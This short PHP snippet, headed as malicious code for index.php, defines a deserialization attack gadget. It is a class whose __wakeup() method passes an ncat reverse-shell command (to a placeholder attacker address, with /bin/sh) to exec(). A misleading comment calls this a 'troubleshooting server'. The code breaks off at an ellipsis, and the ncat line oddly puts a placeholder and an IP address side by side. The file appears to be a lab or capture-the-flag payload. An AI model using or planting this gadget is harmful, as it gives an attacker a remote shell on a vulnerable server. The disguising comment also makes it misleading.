# malicious code for index.php

<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server

public function __wakeup() {
    exec($this->command);

...
}
}

?>